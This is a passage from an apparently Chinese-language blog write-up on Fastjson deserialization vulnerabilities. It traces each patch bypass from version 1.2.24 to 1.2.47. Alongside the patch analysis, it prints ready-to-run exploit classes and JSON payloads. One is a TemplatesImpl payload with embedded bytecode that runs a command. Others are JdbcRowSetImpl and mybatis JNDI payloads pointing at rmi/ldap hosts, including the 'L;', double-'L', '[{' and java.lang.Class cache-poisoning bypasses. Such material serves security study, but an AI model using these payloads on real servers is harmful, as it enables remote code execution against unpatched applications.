+<pre><code class="language-java">{&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtMdGV4dC9odHRwOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwApAQAKU291cmNlRmlsZQEACWh0dHAuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAzAAoBAAl0ZXh0L2h0dHABAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAAAAIADAAAAAYAAQAAAAsADQAAAAwAAQAAAAUADgAPAAAAAQAQABEAAgALAAAAPwAAAAMAAAABsQAAAAIADAAAAAYAAQAAABgADQAAACAAAwAAAAEADgAPAAAAAAABABIAEwABAAAAAQAUABUAAgAWAAAABAABABcAAQAQABgAAgALAAAASQAAAAQAAAABsQAAAAIADAAAAAYAAQAAAB0ADQAAACoABAAAAAEADgAPAAAAAAABABIAEwABAAAAAQAZABoAAgAAAAEAGwAcAAMAFgAAAAQAAQAXAAgAHQAKAAEACwAAAGEAAgABAAAAErgAAhIDtgAEV6cACEsqtgAGsQABAAAACQAMAAUAAwAMAAAAFgAFAAAADgAJABIADAAQAA0AEQARABMADQAAAAwAAQANAAQAHgAfAAAAIAAAAAcAAkwHACEEAAEAIgAAAAIAIw==&quot;],&quot;_tfactory&quot;:{ },&quot;_name&quot;:&quot;Bloyet&quot;,&quot;_outputProperties&quot;:{}}
+</code></pre>
+<p>EXP：</p>
+<pre><code class="language-java">package org.example;
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.Feature;
+
+public class TemplateImplEXP {
+    public static void main(String[] args) {
+
+        String EXP = &quot;{\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtMdGV4dC9odHRwOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwApAQAKU291cmNlRmlsZQEACWh0dHAuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAzAAoBAAl0ZXh0L2h0dHABAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAAAAIADAAAAAYAAQAAAAsADQAAAAwAAQAAAAUADgAPAAAAAQAQABEAAgALAAAAPwAAAAMAAAABsQAAAAIADAAAAAYAAQAAABgADQAAACAAAwAAAAEADgAPAAAAAAABABIAEwABAAAAAQAUABUAAgAWAAAABAABABcAAQAQABgAAgALAAAASQAAAAQAAAABsQAAAAIADAAAAAYAAQAAAB0ADQAAACoABAAAAAEADgAPAAAAAAABABIAEwABAAAAAQAZABoAAgAAAAEAGwAcAAMAFgAAAAQAAQAXAAgAHQAKAAEACwAAAGEAAgABAAAAErgAAhIDtgAEV6cACEsqtgAGsQABAAAACQAMAAUAAwAMAAAAFgAFAAAADgAJABIADAAQAA0AEQARABMADQAAAAwAAQANAAQAHgAfAAAAIAAAAAcAAkwHACEEAAEAIgAAAAIAIw==\&quot;],\&quot;_tfactory\&quot;:{ },\&quot;_name\&quot;:\&quot;Bloyet\&quot;,\&quot;_outputProperties\&quot;:{}}&quot;;
+        Object TemplateEXP = JSON.parseObject(EXP,Object.class, Feature.SupportNonPublicField);
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="24"><img src="https://bloyet.github.io/post-images/1749492822158.png" alt="" loading="lazy"></figure>
+<p>但是这里其实是有一些疑问的：</p>
+<p>_bytecodes 原本得是二维数组，但是用二维数组去进行编码会先转换为一维数组在进行编码，这样打不通，需要直接就用一维数组直接编码</p>
+<p>然后就是命名问题，之前在cb链的时候调用getter方法的时候_outputProperties这个属性是不能加下划线的，但是这里又可以，按我的理解是差不多的，都是自动调用getter方法，但是在fastjson里面这里加和不加都是可以打通的，下面这个是cb链的EXP</p>
+<figure data-type="image" tabindex="25"><img src="https://bloyet.github.io/post-images/1749492822173.png" alt="" loading="lazy"></figure>
+<p>ai解释：</p>
+<figure data-type="image" tabindex="26"><img src="https://bloyet.github.io/post-images/1749492822189.png" alt="" loading="lazy"></figure>
+<h1 id="1225-1241绕过">1.2.25-1.2.41绕过</h1>
+<p>先看它是怎么修复这个漏洞的，打的什么补丁</p>
+<p>1.2.24 之后的第一次更新，官方引入<code>checkAutoType</code>机制，默认情况下，autoTypeSupport 关闭，不能直接反序列化任意类。打开<code>AutoType</code>之后是基于黑名单来实现安全检测的，fastjson 也提供了添加黑名单的接口</p>
+<p>之前：</p>
+<figure data-type="image" tabindex="27"><img src="https://bloyet.github.io/post-images/1749492821972.webp" alt="" loading="lazy"></figure>
+<p>更新后：</p>
+<figure data-type="image" tabindex="28"><img src="https://bloyet.github.io/post-images/1749492822205.png" alt="" loading="lazy"></figure>
+<p>发现多了一个checkAutoType方法，步入看看：</p>
+<pre><code class="language-java">public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) {
+    if (typeName == null) {
+        return null;
+    } else {
+        String className = typeName.replace('$', '.');
+        if (this.autoTypeSupport || expectClass != null) {
+            int i;
+            String deny;
+            for(i = 0; i &lt; this.acceptList.length; ++i) {
+                deny = this.acceptList[i];
+                if (className.startsWith(deny)) {
+                    return TypeUtils.loadClass(typeName, this.defaultClassLoader);
+                }
+            }
+
+            for(i = 0; i &lt; this.denyList.length; ++i) {
+                deny = this.denyList[i];
+                if (className.startsWith(deny)) {
+                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+                }
+            }
+        }
+
+        Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);
+        if (clazz == null) {
+            clazz = this.deserializers.findClass(typeName);
+        }
+
+        if (clazz != null) {
+            if (expectClass != null &amp;&amp; !expectClass.isAssignableFrom(clazz)) {
+                throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+            } else {
+                return clazz;
+            }
+        } else {
+            if (!this.autoTypeSupport) {
+                String accept;
+                int i;
+                for(i = 0; i &lt; this.denyList.length; ++i) {
+                    accept = this.denyList[i];
+                    if (className.startsWith(accept)) {
+                        throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+                    }
+                }
+
+                for(i = 0; i &lt; this.acceptList.length; ++i) {
+                    accept = this.acceptList[i];
+                    if (className.startsWith(accept)) {
+                        clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader);
+                        if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) {
+                            throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+                        }
+
+                        return clazz;
+                    }
+                }
+            }
+
+            if (this.autoTypeSupport || expectClass != null) {
+                clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader);
+            }
+
+            if (clazz != null) {
+                if (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz)) {
+                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+                }
+
+                if (expectClass != null) {
+                    if (expectClass.isAssignableFrom(clazz)) {
+                        return clazz;
+                    }
+
+                    throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+                }
+            }
+
+            if (!this.autoTypeSupport) {
+                throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+            } else {
+                return clazz;
+            }
+        }
+    }
+}
+</code></pre>
+<p>第一个是开启autoTypeSupport状态</p>
+<p>如果加载的类在白名单上，就直接加载，然后在进行黑名单遍历，如果有就直接报错，没有就正常运行</p>
+<p>一个是关闭autoTypeSupport状态</p>
+<p>先黑名单检查，然后在白名单检查，有就加载，没有就过</p>
+<p>还有一个就是在经历过上面条件之后还没有return走，并且还开启了autoTypeSupport状态的</p>
+<p>直接加载类</p>
+<p>在这三个能类加载的地方，最有可能利用的就是第三个，但是要走到第三个还得走第一个，可以不在白名单上面，但是不能在黑名单上面，这里TypeUtils.loadClass方法，就存在一个漏洞了：</p>
+<figure data-type="image" tabindex="29"><img src="https://bloyet.github.io/post-images/1749492822221.png" alt="" loading="lazy"></figure>
+<p>如果类是L开头，;结尾的就去掉，然后在进行类加载，这里就可以帮助我们绕过黑名单了</p>
+<p>EXP：</p>
+<pre><code class="language-java">package org.example;
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.ParserConfig;
+
+
+public class JdbcRowSetImplEXP {
+    public static void main(String[] args) {
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+        Object exp=JSON.parseObject(&quot;{\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;DataSourceName\&quot;:\&quot;rmi://localhost:1099/Bloyet\&quot;,\&quot;AutoCommit\&quot;:true}&quot;);
+    }
+}
+</code></pre>
+<p>这个EXP是得服务器把autoTypeSupport开启才能利用，但是默认情况下是关闭的</p>
+<h1 id="1242绕过">1.2.42绕过</h1>
+<p>补丁就多了个这个，然后黑名单改为了hash值，防止绕过，但是这个就跟sql注入一样，它是直接把传入的类名直接进行检查，如果是L开头，;结尾的直接删除，然后在</p>
+<p>类加载的函数里面逻辑是不变的，那我们直接双写绕过就行</p>
+<figure data-type="image" tabindex="30"><img src="https://bloyet.github.io/post-images/1749492822237.png" alt="" loading="lazy"></figure>
+<p>EXP：</p>
+<pre><code class="language-java">package org.example;
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.ParserConfig;
+
+
+public class JdbcRowSetImplEXP {
+    public static void main(String[] args) {
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+        Object exp=JSON.parseObject(&quot;{\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;DataSourceName\&quot;:\&quot;rmi://localhost:1099/Bloyet\&quot;,\&quot;AutoCommit\&quot;:true}&quot;);
+    }
+}
+</code></pre>
+<h1 id="1243绕过">1.2.43绕过</h1>
+<p>多了个对类名双写LL检测，发现是LL直接报错</p>
+<figure data-type="image" tabindex="31"><img src="https://bloyet.github.io/post-images/1749492822252.png" alt="" loading="lazy"></figure>
+<p>但是还是可以绕过，在我们类名前面先设置为[,让它认为是数组类型，然后去掉[，重新进行类加载，那么&quot;后面的[{是干嘛的？</p>
+<p><code>thisObj = deserializer.deserialze(this, clazz, fieldName);</code> 紧接着进入正常的反序列化流程，使用<code>ObjectArrayCodec</code>类型的反序列化器进行反序列化，其中会提取数组中的成员类型并使用<code>parser.parseArray</code> 进行解析</p>
+<figure data-type="image" tabindex="32"><a href="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/6.png"><img src="https://bloyet.github.io/post-images/1749492822283.png" alt="" loading="lazy"></a></figure>
+<p>当前token不为14时，即会判断是否为<code>&quot;[&quot;</code> ，如果不是会抛出异常；</p>
+<pre><code class="language-java">if (token != 14) {
+    throw new JSONException(&quot;exepct '[', but &quot; + JSONToken.name(token) + &quot;, &quot; + this.lexer.info());
+} else {
+</code></pre>
+<p>当前token不为12 或者 16时，即会判断是否为<code>&quot;{&quot;</code> 或者 <code>&quot;,&quot;</code>，会在进入if流程后抛出异常，下面有一个char和token的对照关系；</p>
+<pre><code class="language-java">if (token != 12 &amp;&amp; token != 16) {
+...
+if (token == 14 &amp;&amp; lexer.getCurrent() == ']') {
+    lexer.next();
+    lexer.nextToken();
+    typeKey = null;
+    return typeKey;
+} else {
+    StringBuffer buf = (new StringBuffer()).append(&quot;syntax error, expect {, actual &quot;).append(lexer.tokenName()).append(&quot;, pos &quot;).append(lexer.pos());
+    if (fieldName instanceof String) {
+        buf.append(&quot;, fieldName &quot;).append(fieldName);
+    }
+
+    buf.append(&quot;, fastjson-version &quot;).append(&quot;1.2.43&quot;);
+    throw new JSONException(buf.toString());
+}
+
+// fastjson-1.2.43.jar!/com/alibaba/fastjson/parser/JSONLexerBase.class
+this.ch == ',' this.token = 16
+this.ch == '[' this.token = 14
+this.ch == '{' this.token = 12
+this.ch == '\'' this.token = 4
+</code></pre>
+<p>因此依次满足上面的条件即可触发payload，有个问题是为什么<code>&quot;{&quot;</code>在逗号前后都能触发，解析过程中判断到当前字符为16，也就是逗号时，会直接跳过该字符，进入下一个字符的处理，因此在<code>&quot;[&quot;</code>后无论是先写逗号还是<code>&quot;{&quot;</code>，最终都是解析<code>&quot;{&quot;</code>字符</p>
+<pre><code class="language-java">if (this.lexer.isEnabled(Feature.AllowArbitraryCommas)) {
+    while(this.lexer.token() == 16) {
+        this.lexer.nextToken();
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="33"><img src="https://bloyet.github.io/post-images/1749492822268.png" alt="" loading="lazy"></figure>
+<pre><code class="language-java">package org.example;
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.ParserConfig;
+
+
+public class JdbcRowSetImplEXP {
+    public static void main(String[] args) {
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+        Object exp=JSON.parseObject(&quot;{\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[{,\&quot;DataSourceName\&quot;:\&quot;rmi://localhost:1099/Bloyet\&quot;,\&quot;AutoCommit\&quot;:true}&quot;);
+    }
+}
+</code></pre>
+<p>所以这个payload也是一条全新的绕过思路，在前面的版本都是可以用这个payload打的</p>
+<h1 id="1245绕过">1.2.45绕过</h1>
+<p>这个版本添加了一些黑名单，但是补充还是不全，如果服务器存在mybatis组件，版本为3.0.1 ≤ 版本 ≤ 3.4.6，可以进行利用</p>
+<figure data-type="image" tabindex="34"><img src="https://bloyet.github.io/post-images/1749492822300.png" alt="" loading="lazy"></figure>
+<p>符合set方法调用，而且还一lookup方法，并且参数也可以控制，这里很有意思啊，我们看看是怎么控制这个参数的</p>
+<pre><code class="language-java">package org.example;
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.ParserConfig;
+
+
+public class EXP {
+    public static void main(String[] args) {
+
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+
+        Object exp=JSON.parseObject(&quot;{\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:{\&quot;data_source\&quot;:\&quot;rmi://localhost:1099/Bloyet\&quot;}}&quot;);
+        System.out.println(exp);
+    }
+}
+</code></pre>
+<p>我们知道在fastjson中自动调用set方法的时候，会把properties后面的当做参数进行传入， 这里并且还是为Properties类型，走到下面调用lookup方法，方法里面还会调用properties.getProperty(DATA_SOURCE)，DATA_SOURCE这个值默认是data_source，那我们跟进这个方法看看：</p>
+<figure data-type="image" tabindex="35"><img src="https://bloyet.github.io/post-images/1749492822314.png" alt="" loading="lazy"></figure>
+<p>我们看到这个方法，他就是根据传入的kay来查找内容，它默认是查找data_source，我们的payload里面设置的data_source的值就是rmi要的值，那就直接进行漏洞利用了</p>
+<figure data-type="image" tabindex="36"><img src="https://bloyet.github.io/post-images/1749492822330.png" alt="" loading="lazy"></figure>
+<h1 id="1247绕过">1.2.47绕过</h1>
+<p>这个版本爆出了很严重的漏洞，可以说是低于1.2.47版本的通杀了</p>
+<p>利用条件：</p>
+<p>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；<br>
+1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；</p>
+<p>问题还是出在checkAutoType</p>
+<pre><code class="language-java">public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) {
+        ...
+        //前面是对typeName格式的各种检测，这里我们暂时跳过
+ 
+        //开启autoTypeSupport，则进入白名单+黑名单检测
+        if (autoTypeSupport || expectClass != null) {
+            long hash = h3;
+            for (int i = 3; i &lt; className.length(); ++i) {
+                hash ^= className.charAt(i);
+                hash *= PRIME;
+ 
+                //白名单检测，这里我们无法绕过
+                if (Arrays.binarySearch(acceptHashCodes, hash) &gt;= 0) {
+                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
+                    if (clazz != null) {
+                        return clazz;
+                    }
+                }
+                
+                //黑名单检测，可以看到这里多了一个从Mapping中寻找类名的判断，绕过的关键就在这里
+                if (Arrays.binarySearch(denyHashCodes, hash) &gt;= 0 &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null) {
+                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+                }
+            }
+        }
+ 
+        if (clazz == null) {
+            //从Mapping缓冲中加载类
+            clazz = TypeUtils.getClassFromMapping(typeName);
+        }
+ 
+        if (clazz == null) {
+            //从deserializer中加载类
+            clazz = deserializers.findClass(typeName);
+        }
+ 
+        if (clazz != null) {
+            if (expectClass != null
+                    &amp;&amp; clazz != java.util.HashMap.class
+                    &amp;&amp; !expectClass.isAssignableFrom(clazz)) {
+                throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+            }
+            //通过上面两个方法加载类后返回
+            return clazz;
+        }
+        
+        //默认开启白名单的情况
+        if (!autoTypeSupport) {
+            long hash = h3;
+            for (int i = 3; i &lt; className.length(); ++i) {
+                char c = className.charAt(i);
+                hash ^= c;
+                hash *= PRIME;
+ 
+                //黑名单校验
+                if (Arrays.binarySearch(denyHashCodes, hash) &gt;= 0) {
+                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+                }
+                
+                //白名单校验
+                if (Arrays.binarySearch(acceptHashCodes, hash) &gt;= 0) {
+                    if (clazz == null) {
+                        clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
+                    }
+ 
+                    if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) {
+                        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+                    }
+ 
+                    return clazz;
+                }
+            }
+        }
+ 
+        if (clazz == null) {
+            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
+        }
+ 
+        ...
+ 
+        return clazz;
+    }
+</code></pre>
+<p>如果服务器开启了autoTypeSupport，就先白名单，然后在进行黑名单，但是这里多了一个判断，如果仅仅是黑名单匹配到了还不行，还要去查找是否有这个类的缓存，如果没有才会爆异常，所以如果可以把我们想要的恶意类写入缓存中，就可以避免被黑名单匹配掉，然后程序没有报错，继续往下走，发现它直接从Mapping中读取类，然后进行加载了。所以说不管你有没有开启autoTypeSupport，按照代码的执行顺序来说，只要我们把恶意类写入了缓存中，就可以实现类加载（如果可以成功读取并加载，然后就会return走了，根本就走不到下面的if判断）</p>
+<p>所以现在就是看怎么把恶意类写入缓存中</p>
+<p>我们先从取出的方法来看 TypeUtils.getClassFromMapping 和 deserializers.findClass</p>
+<p>TypeUtils.getClassFromMapping：</p>
+<figure data-type="image" tabindex="37"><img src="https://bloyet.github.io/post-images/1749492822346.png" alt="" loading="lazy"></figure>
+<p>这里是从mapping中取值出来，写入的方法在哪呢？</p>
+<p>其实写入的方法就在 TypeUtils.loadClass</p>
+<pre><code class="language-java"> public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache) {
+ 
+        ...
+        //对类名进行检查和判断
+        try{
+            //第一处，classLoader不为null
+            if(classLoader != null){
+                clazz = classLoader.loadClass(className);
+ 
+                //如果chche为true，则将我们输入的className缓存入mapping中
+                if (cache) {
+                    mappings.put(className, clazz);
+                }
+                return clazz;
+            }
+        } catch(Throwable e){
+            e.printStackTrace();
+            // skip
+        }
+        try{
+            ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
+ 
+            //第二处，检查较为严格
+            if(contextClassLoader != null &amp;&amp; contextClassLoader != classLoader){
+                clazz = contextClassLoader.loadClass(className);
+ 
+                //如果chche为true，则将我们输入的className缓存入mapping中
+                if (cache) {
+                    mappings.put(className, clazz);
+                }
+                return clazz;
+            }
+        } catch(Throwable e){
+            // skip
+        }
+ 
+        //第三处，限制宽松，但
+        try{
+            clazz = Class.forName(className);
+            mappings.put(className, clazz);
+            return clazz;
+        } catch(Throwable e){
+            // skip
+        }
+        return clazz;
+    }
+</code></pre>
+<p>那么现在就是看看那里还有调用loadClass方法，TypeUtils.loadClass是有三个重载的，最后都是会到上面这个loadClass方法的，我们在两个参数的loadClass方法中找到了调用（两个参数的，刚好chche为true，虽然一个参数的也是会先来到两个参数的，然后在去三个参数的方法）</p>
+<figure data-type="image" tabindex="38"><img src="https://bloyet.github.io/post-images/1749492822360.png" alt="" loading="lazy"></figure>
+<p>在MiscCodec#deserialze方法中</p>
+<p>strVal这个参数就是我们要加载的类（className），我们看怎么控制它的值</p>
+<figure data-type="image" tabindex="39"><img src="https://bloyet.github.io/post-images/1749492822376.png" alt="" loading="lazy"></figure>
+<p>要给strVal赋值，就要objVal不为空，并且objVal的值赋给strVal，那么现在就是看objVal怎么赋值的</p>
+<figure data-type="image" tabindex="40"><img src="https://bloyet.github.io/post-images/1749492822391.png" alt="" loading="lazy"></figure>
+<p>if判断默认是true的（是因为在后续的 parseObject 方法中会将<code>resolveStatus</code>设置为<code>TypeNameRedirect</code>），然后判断json字符串中是否有val键，等等一系列要求，然后就会把val的值解析返回给objVal中</p>
+<figure data-type="image" tabindex="41"><img src="https://bloyet.github.io/post-images/1749492822407.png" alt="" loading="lazy"></figure>
+<p>然后就是只要我们把这个写入进去，我们在去正常加载就不会被黑名单匹配掉了，看payload怎么写：</p>
+<p>首先把它写入缓存</p>
+<pre><code class="language-java">{
+//满足clazz为Class.class
+&quot;@type&quot;:&quot;java.lang.Class&quot;,
+ 
+//有val，且值为我们要写入mapping的恶意类
+&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;
+}
+</code></pre>
+<p>然后就是正常的：</p>
+<pre><code class="language-java">{    
+    &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
+    &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:8000/Bloyet&quot;,
+    &quot;autoCommit&quot;:&quot;true&quot;
+}
+</code></pre>
+<p>合起来：</p>
+<pre><code class="language-java">{
+    &quot;1&quot;: {
+        &quot;@type&quot;: &quot;java.lang.Class&quot;,
+        &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;
+    },
+    &quot;2&quot;: {
+        &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,
+        &quot;dataSourceName&quot;: &quot;ldap://127.0.0.1:1099/Bloyet&quot;,
+        &quot;autoCommit&quot;: true
+    }
+}
+</code></pre>
+<p>EXP:</p>
+<pre><code class="language-java">package org.example;
+
+import com.alibaba.fastjson.JSON;
+
+public class EXP_tongsha {
+    public static void main(String[] args) {
+       Object  EXP = JSON.parseObject(&quot;{\n&quot; +
+               &quot;    \&quot;1\&quot;: {\n&quot; +
+               &quot;        \&quot;@type\&quot;: \&quot;java.lang.Class\&quot;,\n&quot; +
+               &quot;        \&quot;val\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;\n&quot; +
+               &quot;    },\n&quot; +
+               &quot;    \&quot;2\&quot;: {\n&quot; +
+               &quot;        \&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot; +
+               &quot;        \&quot;dataSourceName\&quot;: \&quot;rmi://127.0.0.1:1099/Bloyet\&quot;,\n&quot; +
+               &quot;        \&quot;autoCommit\&quot;: true\n&quot; +
+               &quot;    }\n&quot; +
+               &quot;}&quot;);
+    }
+}
+</code></pre>
+<p>好文章：</p>
+<p><a href="https://drops.blbana.cc/2020/04/16/Fastjson%E5%8E%86%E5%8F%B2%E8%A1%A5%E4%B8%81Bypass%E5%88%86%E6%9E%90/#%E7%BB%95%E8%BF%87%E5%8E%9F%E5%9B%A0-2">Fastjson历史补丁Bypass分析 · BlBana’s BlackHouse</a></p>
+<p>[Fastjson 反序列化漏洞 · 攻击Java Web应用-<a href="https://www.javasec.org/java-vuls/FastJson.html">Java Web安全]</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#fastjson%E4%BB%8B%E7%BB%8D">Fastjson介绍</a></li>
+<li><a href="#fastjson%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0">Fastjson基础学习</a></li>
+<li><a href="#fastjson%E8%B0%83%E7%94%A8%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90">Fastjson调用简单分析</a>
+<ul>
+<li><a href="#%E5%BA%8F%E5%88%97%E5%8C%96">序列化</a></li>
+<li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">反序列化</a></li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">漏洞利用</a></li>
+<li><a href="#fastjson1224%E5%88%A9%E7%94%A8%E9%93%BE">Fastjson&lt;=1.2.24利用链</a>
